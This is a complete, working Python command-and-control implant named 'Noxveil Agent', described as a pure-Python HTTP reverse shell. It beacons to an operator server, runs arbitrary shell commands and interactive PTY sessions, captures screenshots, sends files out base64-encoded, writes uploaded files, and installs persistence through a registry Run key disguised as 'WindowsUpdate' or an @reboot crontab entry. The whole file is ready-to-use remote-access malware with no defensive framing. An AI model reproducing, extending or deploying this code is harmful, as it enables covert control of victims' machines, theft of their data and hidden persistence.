import argparse
import base64
import getpass
import hashlib
import json
import os
import platform
import queue
import random
import shlex
import shutil
import signal
import socket
import ssl
import subprocess
import sys
import tempfile
import threading
import time
from contextlib import suppress
from typing import Any, Dict, List, Optional
from urllib import error, request


C2_URL = "__C2_URL_PLACEHOLDER__"
AGENT_AUTH_TOKEN = "__AUTH_TOKEN_PLACEHOLDER__"
DEFAULT_CALLBACK_INTERVAL = 5
DEFAULT_JITTER = 2
SHELL_SESSION_IDLE_TIMEOUT = 900


class HTTPClient:
    def __init__(self, auth_token: str):
        self.auth_token = auth_token
        self.last_ok = False
        self.last_status_code: Optional[int] = None
        self.last_error: Optional[str] = None

    def set_auth_token(self, auth_token: str):
        self.auth_token = auth_token

    def _ssl_context(self) -> ssl.SSLContext:
        context = ssl.create_default_context()
        ca_bundle = os.getenv("C2_CA_BUNDLE")
        if ca_bundle:
            context.load_verify_locations(cafile=ca_bundle)

        if os.getenv("C2_INSECURE_TLS", "").lower() == "true":
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        return context

    def _headers(self) -> Dict[str, str]:
        return {
            "User-Agent": "Noxveil-Agent/1.1",
            "Accept": "application/json",
            "Authorization": f"Bearer {self.auth_token}",
            "Content-Type": "application/json",
        }

    def _request(self, method: str, url: str, data: Any = None, timeout: int = 10) -> Optional[Dict[str, Any]]:
        self.last_ok = False
        self.last_status_code = None
        self.last_error = None

        body = None
        if data is not None:
            body = json.dumps(data).encode("utf-8")

        req = request.Request(url, data=body, headers=self._headers(), method=method)
        kwargs = {"timeout": timeout}
        if url.lower().startswith("https://"):
            kwargs["context"] = self._ssl_context()

        try:
            with request.urlopen(req, **kwargs) as response:
                expected_pin = os.getenv("C2_CERT_SHA256", "").strip().lower().replace(":", "")
                if expected_pin and url.lower().startswith("https://"):
                    peer_cert = None
                    try:
                        raw_stream = getattr(response, "fp", None)
                        raw_socket = getattr(getattr(raw_stream, "raw", None), "_sock", None)
                        if raw_socket:
                            peer_cert = raw_socket.getpeercert(binary_form=True)
                    except Exception:
                        peer_cert = None

                    if not peer_cert:
                        self.last_error = "Certificate pinning failed: peer certificate unavailable"
                        return None

                    actual_pin = hashlib.sha256(peer_cert).hexdigest().lower()
                    if actual_pin != expected_pin:
                        self.last_error = "Certificate pinning failed: fingerprint mismatch"
                        return None

                self.last_ok = True
                self.last_status_code = response.status
                raw_body = response.read().decode("utf-8")
                return json.loads(raw_body) if raw_body else {}
        except error.HTTPError as exc:
            self.last_status_code = exc.code
            self.last_error = f"HTTP {exc.code}: {exc.reason}"
            return None
        except error.URLError as exc:
            self.last_error = f"URL error: {exc.reason}"
            return None
        except Exception as exc:
            self.last_error = str(exc)
            return None

    def post(self, url: str, data: Any = None, timeout: int = 10) -> Optional[Dict[str, Any]]:
        return self._request("POST", url, data=data, timeout=timeout)

    def get(self, url: str, timeout: int = 10) -> Optional[Dict[str, Any]]:
        return self._request("GET", url, timeout=timeout)


class InteractiveShellSession:
    def __init__(self, session_id: str, cwd: str):
        self.session_id = session_id
        self.cwd = cwd
        self.created_at = time.time()
        self.last_activity = self.created_at
        self._output_queue: "queue.Queue[bytes]" = queue.Queue()
        self._reader_thread: Optional[threading.Thread] = None
        self._master_fd: Optional[int] = None
        self.process: Optional[subprocess.Popen] = None
        self._start_process()

    def _resolve_shell(self) -> str:
        if platform.system() == "Windows":
            return os.getenv("COMSPEC") or "cmd.exe"
        return shutil.which("bash") or shutil.which("sh") or os.getenv("SHELL") or "/bin/sh"

    def _start_process(self) -> None:
        shell = self._resolve_shell()
        shell_env = os.environ.copy()
        shell_env.setdefault("TERM", "xterm-256color")
        shell_env.setdefault("HOME", os.path.expanduser("~"))

        if os.name == "posix":
            master_fd, slave_fd = os.openpty()
            self.process = subprocess.Popen(
                [shell],
                stdin=slave_fd,
                stdout=slave_fd,
                stderr=slave_fd,
                cwd=self.cwd,
                env=shell_env,
                close_fds=True,
            )
            os.close(slave_fd)
            self._master_fd = master_fd
            os.set_blocking(master_fd, False)
            time.sleep(0.15)
            return

        creation_flags = getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)
        self.process = subprocess.Popen(
            [shell],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=self.cwd,
            env=shell_env,
            creationflags=creation_flags,
        )

        def _reader() -> None:
            if not self.process or not self.process.stdout:
                return
            while True:
                chunk = self.process.stdout.read(4096)
                if not chunk:
                    break
                self._output_queue.put(chunk)

        self._reader_thread = threading.Thread(target=_reader, daemon=True)
        self._reader_thread.start()
        time.sleep(0.15)

    def is_alive(self) -> bool:
        return bool(self.process and self.process.poll() is None)

    def is_idle(self, idle_timeout: int = SHELL_SESSION_IDLE_TIMEOUT) -> bool:
        return time.time() - self.last_activity > idle_timeout

    def read_output(self) -> str:
        chunks: list[bytes] = []

        if self._master_fd is not None:
            while True:
                try:
                    data = os.read(self._master_fd, 4096)
                except BlockingIOError:
                    break
                except OSError:
                    break

                if not data:
                    break
                chunks.append(data)
        else:
            while True:
                try:
                    chunks.append(self._output_queue.get_nowait())
                except queue.Empty:
                    break

        if chunks:
            self.last_activity = time.time()
        return b"".join(chunks).decode("utf-8", errors="replace")

    def write_line(self, value: str) -> str:
        data = value.encode("utf-8", errors="replace")
        if not data.endswith(b"\n"):
            data += b"\n"
        self._write_bytes(data)
        time.sleep(0.15)
        return self.read_output()

    def interrupt(self) -> str:
        if not self.process:
            return ""
        if self._master_fd is not None:
            self._write_bytes(b"\x03", append_newline=False)
        elif platform.system() == "Windows":
            with suppress(Exception):
                self.process.send_signal(signal.CTRL_BREAK_EVENT)
        else:
            with suppress(Exception):
                self.process.send_signal(signal.SIGINT)
        time.sleep(0.15)
        return self.read_output()

    def _write_bytes(self, data: bytes, append_newline: bool = False) -> None:
        if append_newline:
            data += b"\n"
        self.last_activity = time.time()
        if self._master_fd is not None:
            os.write(self._master_fd, data)
            return
        if self.process and self.process.stdin:
            self.process.stdin.write(data)
            self.process.stdin.flush()

    def close(self) -> None:
        process = self.process
        self.process = None
        if not process:
            return

        if process.poll() is None:
            with suppress(Exception):
                process.terminate()
            try:
                process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                with suppress(Exception):
                    process.kill()
                with suppress(Exception):
                    process.wait(timeout=2)

        if self._master_fd is not None:
            with suppress(OSError):
                os.close(self._master_fd)
            self._master_fd = None


class Agent:
    def __init__(
        self,
        c2_url: str,
        callback_interval: int = DEFAULT_CALLBACK_INTERVAL,
        jitter: int = DEFAULT_JITTER,
        auth_token: str = AGENT_AUTH_TOKEN,
        silent: bool = False,
    ):
        self.c2_url = c2_url.rstrip("/")
        self.callback_interval = callback_interval
        self.jitter = jitter
        self.bootstrap_token = auth_token
        self.auth_token = auth_token
        self.silent = silent
        self.agent_id: Optional[str] = None
        self.registered = False
        self.current_dir = os.getcwd()
        self.http = HTTPClient(auth_token)
        self.shell_sessions: Dict[str, InteractiveShellSession] = {}

    def log(self, message: str):
        if not self.silent:
            print(message)

    def _set_auth_token(self, token: str):
        self.auth_token = token
        self.http.set_auth_token(token)

    def gather_sysinfo(self) -> Dict[str, Any]:
        return {
            "hostname": socket.gethostname(),
            "username": getpass.getuser(),
            "os_info": f"{platform.system()} {platform.release()} {platform.machine()}",
            "internal_ip": self._get_internal_ip(),
            "pid": os.getpid(),
        }

    def _get_internal_ip(self) -> str:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.connect(("8.8.8.8", 80))
            return sock.getsockname()[0]
        except Exception:
            return "unknown"
        finally:
            sock.close()

    def register(self, force: bool = False) -> bool:
        if self.registered and not force:
            return True

        self._set_auth_token(self.bootstrap_token)
        response = self.http.post(f"{self.c2_url}/api/v1/register", data=self.gather_sysinfo())
        if not response:
            self.log(f"[!] Registration failed: {self.http.last_error or 'unknown error'}")
            return False

        agent_id = response.get("agent_id")
        agent_token = response.get("agent_token")
        if not agent_id or not agent_token:
            self.log("[!] Registration response missing agent_id or agent_token")
            return False

        self.agent_id = str(agent_id)
        self.registered = True
        self.callback_interval = int(response.get("callback_interval", self.callback_interval))
        self._set_auth_token(str(agent_token))
        self.log(f"[*] Agent registered with ID: {self.agent_id}")
        return True

    def beacon(self) -> List[Dict[str, Any]]:
        if not self.agent_id:
            return []
        response = self.http.get(f"{self.c2_url}/api/v1/tasks/{self.agent_id}")
        if not response:
            return []

        interval = response.get("interval")
        if isinstance(interval, int) and interval > 0:
            self.callback_interval = interval
        return response.get("tasks", [])

    def send_result(self, task_id: str, output: str, is_error: bool = False) -> bool:
        response = self.http.post(
            f"{self.c2_url}/api/v1/results",
            data={"task_id": task_id, "output": output, "is_error": is_error},
        )
        return response is not None

    def heartbeat(self) -> bool:
        if not self.agent_id:
            return False
        response = self.http.get(f"{self.c2_url}/api/v1/heartbeat/{self.agent_id}")
        if not response:
            return False

        interval = response.get("interval")
        if isinstance(interval, int) and interval > 0:
            self.callback_interval = interval
        return True

    def _cleanup_shell_sessions(self) -> None:
        stale_session_ids = [
            session_id
            for session_id, session in self.shell_sessions.items()
            if not session.is_alive() or session.is_idle()
        ]
        for session_id in stale_session_ids:
            session = self.shell_sessions.pop(session_id, None)
            if session:
                session.close()

    @staticmethod
    def _clean_session_output(output: str) -> str:
        noisy_markers = (
            "bash: cannot set terminal process group",
            "bash: no job control in this shell",
            "warning: No TTY for interactive shell",
            "setpgid: Inappropriate ioctl for device",
        )
        cleaned_lines = [
            line for line in str(output or "").splitlines()
            if not any(marker in line for marker in noisy_markers)
        ]
        return "\n".join(cleaned_lines)

    def _session_response(
        self,
        session_id: str,
        *,
        event: str,
        output: str = "",
        alive: bool = True,
        is_error: bool = False,
    ) -> Dict[str, Any]:
        return {
            "task_id": "",
            "output": json.dumps(
                {
                    "session_id": session_id,
                    "event": event,
                    "output": output,
                    "alive": alive,
                    "timestamp": time.time(),
                }
            ),
            "is_error": is_error,
        }

    def _session_error(self, task_id: str, session_id: str, message: str) -> Dict[str, Any]:
        payload = self._session_response(
            session_id,
            event="error",
            output=message,
            alive=bool(self.shell_sessions.get(session_id) and self.shell_sessions[session_id].is_alive()),
            is_error=True,
        )
        payload["task_id"] = task_id
        return payload

    def _session_probe(self, task_id: str) -> Dict[str, Any]:
        payload = {
            "task_id": task_id,
            "output": json.dumps({"supported": True, "version": "interactive_shell_v1"}),
            "is_error": False,
        }
        return payload

    def _parse_session_command_payload(self, raw_payload: str) -> Dict[str, Any]:
        try:
            payload = json.loads(raw_payload or "{}")
        except json.JSONDecodeError as exc:
            raise ValueError("Session payload must be valid JSON") from exc
        if not isinstance(payload, dict):
            raise ValueError("Session payload must be a JSON object")
        return payload

    def _session_start(self, task_id: str, raw_payload: str) -> Dict[str, Any]:
        try:
            payload = self._parse_session_command_payload(raw_payload)
        except ValueError as exc:
            return {"task_id": task_id, "output": str(exc), "is_error": True}

        session_id = str(payload.get("session_id", "")).strip()
        if not session_id:
            return {"task_id": task_id, "output": "session_id is required", "is_error": True}

        existing = self.shell_sessions.pop(session_id, None)
        if existing:
            existing.close()

        try:
            session = InteractiveShellSession(session_id=session_id, cwd=self.current_dir)
            self.shell_sessions[session_id] = session
            output = self._clean_session_output(session.read_output())
            result = self._session_response(
                session_id,
                event="started",
                output=output,
                alive=session.is_alive(),
                is_error=False,
            )
            result["task_id"] = task_id
            return result
        except Exception as exc:
            return {"task_id": task_id, "output": f"Failed to start shell session: {exc}", "is_error": True}

    def _session_input(self, task_id: str, raw_payload: str) -> Dict[str, Any]:
        try:
            payload = self._parse_session_command_payload(raw_payload)
        except ValueError as exc:
            return {"task_id": task_id, "output": str(exc), "is_error": True}

        session_id = str(payload.get("session_id", "")).strip()
        data = str(payload.get("data", ""))
        session = self.shell_sessions.get(session_id)
        if not session:
            return self._session_error(task_id, session_id, "Interactive shell session not found")

        try:
            raw_data = base64.b64decode(data.encode("ascii")).decode("utf-8", errors="replace")
        except Exception as exc:
            return self._session_error(task_id, session_id, f"Invalid session input encoding: {exc}")

        try:
            output = self._clean_session_output(session.write_line(raw_data))
            result = self._session_response(
                session_id,
                event="input",
                output=output,
                alive=session.is_alive(),
                is_error=False,
            )
            result["task_id"] = task_id
            if not session.is_alive():
                self.shell_sessions.pop(session_id, None)
                session.close()
            return result
        except Exception as exc:
            return self._session_error(task_id, session_id, f"Failed to write to shell session: {exc}")

    def _session_poll(self, task_id: str, raw_payload: str) -> Dict[str, Any]:
        try:
            payload = self._parse_session_command_payload(raw_payload)
        except ValueError as exc:
            return {"task_id": task_id, "output": str(exc), "is_error": True}

        session_id = str(payload.get("session_id", "")).strip()
        session = self.shell_sessions.get(session_id)
        if not session:
            return self._session_error(task_id, session_id, "Interactive shell session not found")

        try:
            output = self._clean_session_output(session.read_output())
            result = self._session_response(
                session_id,
                event="poll",
                output=output,
                alive=session.is_alive(),
                is_error=False,
            )
            result["task_id"] = task_id
            if not session.is_alive():
                self.shell_sessions.pop(session_id, None)
                session.close()
            return result
        except Exception as exc:
            return self._session_error(task_id, session_id, f"Failed to poll shell session: {exc}")

    def _session_signal(self, task_id: str, raw_payload: str) -> Dict[str, Any]:
        try:
            payload = self._parse_session_command_payload(raw_payload)
        except ValueError as exc:
            return {"task_id": task_id, "output": str(exc), "is_error": True}

        session_id = str(payload.get("session_id", "")).strip()
        signal_name = str(payload.get("signal", "")).strip().lower()
        session = self.shell_sessions.get(session_id)
        if not session:
            return self._session_error(task_id, session_id, "Interactive shell session not found")

        if signal_name != "interrupt":
            return self._session_error(task_id, session_id, f"Unsupported session signal: {signal_name or 'unknown'}")

        try:
            output = self._clean_session_output(session.interrupt())
            result = self._session_response(
                session_id,
                event="signal",
                output=output,
                alive=session.is_alive(),
                is_error=False,
            )
            result["task_id"] = task_id
            return result
        except Exception as exc:
            return self._session_error(task_id, session_id, f"Failed to signal shell session: {exc}")

    def _session_close(self, task_id: str, raw_payload: str) -> Dict[str, Any]:
        try:
            payload = self._parse_session_command_payload(raw_payload)
        except ValueError as exc:
            return {"task_id": task_id, "output": str(exc), "is_error": True}

        session_id = str(payload.get("session_id", "")).strip()
        session = self.shell_sessions.pop(session_id, None)
        if not session:
            return self._session_error(task_id, session_id, "Interactive shell session not found")

        try:
            session.close()
            result = self._session_response(session_id, event="closed", output="Shell session closed", alive=False, is_error=False)
            result["task_id"] = task_id
            return result
        except Exception as exc:
            return self._session_error(task_id, session_id, f"Failed to close shell session: {exc}")

    def _execute_task(self, task: Dict[str, Any]) -> Dict[str, Any]:
        command = str(task.get("command", ""))
        task_id = str(task.get("id", ""))

        if command == "!session_probe":
            return self._session_probe(task_id)
        if command.startswith("!session_start "):
            return self._session_start(task_id, command[len("!session_start "):].strip())
        if command.startswith("!session_input "):
            return self._session_input(task_id, command[len("!session_input "):].strip())
        if command.startswith("!session_poll "):
            return self._session_poll(task_id, command[len("!session_poll "):].strip())
        if command.startswith("!session_signal "):
            return self._session_signal(task_id, command[len("!session_signal "):].strip())
        if command.startswith("!session_close "):
            return self._session_close(task_id, command[len("!session_close "):].strip())

        if command == "!kill":
            return {
                "task_id": task_id,
                "output": "Agent terminated by operator",
                "is_error": False,
                "exit": True,
            }
        if command == "!sleep":
            return {"task_id": task_id, "output": f"Sleep interval is {self.callback_interval}s", "is_error": False}
        if command.startswith("!sleep "):
            try:
                new_interval = int(command.split(" ", 1)[1])
                if new_interval < 1:
                    raise ValueError
                self.callback_interval = new_interval
                return {
                    "task_id": task_id,
                    "output": f"Sleep interval changed to {new_interval}s",
                    "is_error": False,
                }
            except ValueError:
                return {"task_id": task_id, "output": "Invalid sleep interval", "is_error": True}
        if command == "!screenshot":
            return self._take_screenshot(task_id)
        if command == "!info":
            return {"task_id": task_id, "output": json.dumps(self.gather_sysinfo(), indent=2), "is_error": False}
        if command.startswith("!download "):
            return self._download_file(task_id, command[10:].strip().strip('"'))
        if command.startswith("!upload "):
            return self._upload_file(task_id, command[8:].strip())
        if command == "!persist":
            return self._install_persistence(task_id)
        if command.startswith("cd "):
            return self._change_directory(task_id, command[3:].strip())
        return self._run_shell_command(task_id, command)

    def _run_shell_command(self, task_id: str, command: str) -> Dict[str, Any]:
        try:
            executable = "cmd.exe" if platform.system() == "Windows" else (shutil.which("bash") or shutil.which("sh") or os.getenv("SHELL") or "/bin/sh")
            result = subprocess.run(
                command,
                shell=True,
                executable=executable,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=self.current_dir,
            )
            output = result.stdout + result.stderr
            if not output:
                output = "(no output)"
            return {"task_id": task_id, "output": output, "is_error": result.returncode != 0}
        except subprocess.TimeoutExpired:
            return {"task_id": task_id, "output": "Command timed out (30s)", "is_error": True}
        except Exception as exc:
            return {"task_id": task_id, "output": str(exc), "is_error": True}

    def _take_screenshot(self, task_id: str) -> Dict[str, Any]:
        try:
            if platform.system() == "Darwin":
                return self._screenshot_macos(task_id)
            if platform.system() == "Windows":
                return self._screenshot_windows(task_id)
            return self._screenshot_linux(task_id)
        except Exception as exc:
            return {"task_id": task_id, "output": f"Screenshot failed: {exc}", "is_error": True}

    def _screenshot_macos(self, task_id: str) -> Dict[str, Any]:
        temp_file = os.path.join(tempfile.gettempdir(), f"screenshot_{task_id}.png")
        result = subprocess.run(["screencapture", "-x", temp_file], capture_output=True, text=True)
        if result.returncode == 0 and os.path.exists(temp_file):
            with open(temp_file, "rb") as handle:
                b64_image = base64.b64encode(handle.read()).decode("ascii")
            os.remove(temp_file)
            return {"task_id": task_id, "output": b64_image, "is_error": False}
        return {"task_id": task_id, "output": "screencapture failed", "is_error": True}

    def _screenshot_windows(self, task_id: str) -> Dict[str, Any]:
        temp_file = os.path.join(tempfile.gettempdir(), f"screenshot_{task_id}.png")
        ps_command = f"""
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$bitmap.Save("{temp_file}")
$graphics.Dispose()
$bitmap.Dispose()
"""
        result = subprocess.run(["powershell", "-NoProfile", "-Command", ps_command], capture_output=True, text=True)
        if result.returncode == 0 and os.path.exists(temp_file):
            with open(temp_file, "rb") as handle:
                b64_image = base64.b64encode(handle.read()).decode("ascii")
            os.remove(temp_file)
            return {"task_id": task_id, "output": b64_image, "is_error": False}
        return {"task_id": task_id, "output": "PowerShell screenshot failed", "is_error": True}

    def _screenshot_linux(self, task_id: str) -> Dict[str, Any]:
        temp_file = os.path.join(tempfile.gettempdir(), f"screenshot_{task_id}.png")
        tools = [
            ["scrot", temp_file],
            ["gnome-screenshot", "-f", temp_file],
            ["import", "-window", "root", temp_file],
        ]
        for tool_cmd in tools:
            try:
                result = subprocess.run(tool_cmd, capture_output=True, text=True)
                if result.returncode == 0 and os.path.exists(temp_file):
                    with open(temp_file, "rb") as handle:
                        b64_image = base64.b64encode(handle.read()).decode("ascii")
                    os.remove(temp_file)
                    return {"task_id": task_id, "output": b64_image, "is_error": False}
            except Exception:
                continue

        return {
            "task_id": task_id,
            "output": "No screenshot tool available (try: scrot, gnome-screenshot, or ImageMagick)",
            "is_error": True,
        }

    def _download_file(self, task_id: str, filepath: str) -> Dict[str, Any]:
        try:
            with open(filepath, "rb") as handle:
                b64_data = base64.b64encode(handle.read()).decode("ascii")
            return {"task_id": task_id, "output": b64_data, "is_error": False}
        except FileNotFoundError:
            return {"task_id": task_id, "output": f"File not found: {filepath}", "is_error": True}
        except Exception as exc:
            return {"task_id": task_id, "output": f"File read error: {exc}", "is_error": True}

    def _upload_file(self, task_id: str, raw_payload: str) -> Dict[str, Any]:
        try:
            payload = json.loads(raw_payload)
            target_path = str(payload.get("path", "")).strip()
            b64_data = str(payload.get("data", "")).strip()
            if not target_path or not b64_data:
                return {"task_id": task_id, "output": "Upload payload must include path and data", "is_error": True}

            file_data = base64.b64decode(b64_data.encode("ascii"))
            parent_dir = os.path.dirname(target_path)
            if parent_dir:
                os.makedirs(parent_dir, exist_ok=True)
            with open(target_path, "wb") as handle:
                handle.write(file_data)
            return {
                "task_id": task_id,
                "output": f"Uploaded {len(file_data)} bytes to {target_path}",
                "is_error": False,
            }
        except json.JSONDecodeError:
            return {"task_id": task_id, "output": "Upload payload must be valid JSON", "is_error": True}
        except Exception as exc:
            return {"task_id": task_id, "output": f"Upload failed: {exc}", "is_error": True}

    def _change_directory(self, task_id: str, path: str) -> Dict[str, Any]:
        try:
            os.chdir(path)
            self.current_dir = os.getcwd()
            return {"task_id": task_id, "output": f"Changed directory to: {self.current_dir}", "is_error": False}
        except Exception as exc:
            return {"task_id": task_id, "output": str(exc), "is_error": True}

    def _install_persistence(self, task_id: str) -> Dict[str, Any]:
        try:
            if platform.system() == "Windows":
                return self._install_windows_persistence(task_id)
            return self._install_linux_persistence(task_id)
        except Exception as exc:
            return {"task_id": task_id, "output": f"Persistence install failed: {exc}", "is_error": True}

    def _install_windows_persistence(self, task_id: str) -> Dict[str, Any]:
        script_path = os.path.abspath(__file__)
        cmd = (
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            f'/v "WindowsUpdate" /t REG_SZ /d "pythonw {script_path}" /f'
        )
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return {"task_id": task_id, "output": "Persistence installed via registry Run key", "is_error": False}
        return {"task_id": task_id, "output": "Failed to install persistence", "is_error": True}

    def _install_linux_persistence(self, task_id: str) -> Dict[str, Any]:
        script_path = os.path.abspath(__file__)
        cron_cmd = f'@reboot python3 {shlex.quote(script_path)}'
        result = subprocess.run(
            f'(crontab -l 2>/dev/null; echo {shlex.quote(cron_cmd)}) | crontab -',
            shell=True,
            capture_output=True,
            text=True,
        )
        if result.returncode == 0:
            return {"task_id": task_id, "output": "Persistence installed via crontab @reboot", "is_error": False}
        return {"task_id": task_id, "output": "Failed to install crontab persistence", "is_error": True}

    def _exponential_backoff(self, attempt: int) -> float:
        return min(5 * (2 ** attempt), 300)

    def _sleep_with_jitter(self):
        sleep_time = self.callback_interval + random.uniform(-self.jitter, self.jitter)
        time.sleep(max(1, sleep_time))

    @staticmethod
    def _looks_like_bootstrap_token(token: str) -> bool:
        parts = str(token).strip().split(".")
        return len(parts) == 3 and all(parts)

    def _validate_configuration(self):
        if not isinstance(self.c2_url, str) or not self.c2_url.startswith(("http://", "https://")):
            raise ValueError("A valid Noxveil URL must be provided with --url or an embedded payload URL")
        if not self._looks_like_bootstrap_token(self.bootstrap_token):
            raise ValueError("A valid bootstrap token must be embedded or provided with --token")

    def run(self):
        self._validate_configuration()
        self.log("[*] Agent starting...")
        self.log(f"[*] Noxveil URL: {self.c2_url}")
        self.log("[*] Pure Python - no external dependencies")

        if not self.register():
            self.log("[!] Failed to register. Retrying in 5 seconds...")
            time.sleep(5)
            if not self.register(force=True):
                self.log("[!] Registration failed twice. Exiting.")
                sys.exit(1)

        self.log(f"[*] Agent running. Callback interval: {self.callback_interval}s ± {self.jitter}s")
        failed_attempts = 0

        while True:
            self._cleanup_shell_sessions()
            self._sleep_with_jitter()
            tasks = self.beacon()

            if self.http.last_ok:
                failed_attempts = 0
                if tasks:
                    for task in tasks:
                        result = self._execute_task(task)
                        self.send_result(result["task_id"], result["output"], result["is_error"])
                        if result.get("exit"):
                            self.log("[*] Exiting...")
                            sys.exit(0)
                elif random.random() < 0.1:
                    self.heartbeat()
                continue

            failed_attempts += 1
            delay = self._exponential_backoff(failed_attempts)
            self.log(f"[!] Poll failed: {self.http.last_error or 'unknown error'}. Backing off for {delay}s...")
            time.sleep(delay)

            if failed_attempts >= 3:
                self.registered = False
                self.agent_id = None
                if self.register(force=True):
                    failed_attempts = 0


def main():
    parser = argparse.ArgumentParser(description="Noxveil Agent - Pure Python HTTP Reverse Shell")
    parser.add_argument("--url", type=str, default=C2_URL, help="Noxveil server URL")
    parser.add_argument("--interval", type=int, default=DEFAULT_CALLBACK_INTERVAL, help="Callback interval in seconds")
    parser.add_argument("--jitter", type=int, default=DEFAULT_JITTER, help="Jitter (+/- seconds)")
    parser.add_argument("--token", type=str, default=AGENT_AUTH_TOKEN, help="Bootstrap registration token")
    parser.add_argument("-s", "--silent", action="store_true", help="Run in silent mode")
    args = parser.parse_args()

    agent = Agent(
        c2_url=args.url,
        callback_interval=args.interval,
        jitter=args.jitter,
        auth_token=args.token,
        silent=args.silent,
    )

    def signal_handler(_sig, _frame):
        if not agent.silent:
            print("\n[*] Received signal, shutting down...")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    agent.run()


if __name__ == "__main__":
    main()
